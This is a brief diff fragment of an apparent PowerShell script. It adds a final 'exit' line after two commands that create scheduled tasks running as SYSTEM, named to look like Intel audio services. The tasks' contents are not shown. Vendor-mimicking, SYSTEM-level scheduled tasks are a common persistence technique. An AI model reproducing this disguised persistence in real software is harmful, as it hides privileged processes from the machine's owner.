@@ -44,3 +44,5 @@ if (-Not (Test-Path "$TargetFile")) {
 
 schtasks.exe /Create /XML "$TargetXml" /tn 'Intel Dynamic Audio Platform Service' /ru SYSTEM /f
 schtasks.exe /Create /XML "$TargetEmail" /tn 'Intel Dynamic Audio Notification Service' /ru SYSTEM /f
+
+exit
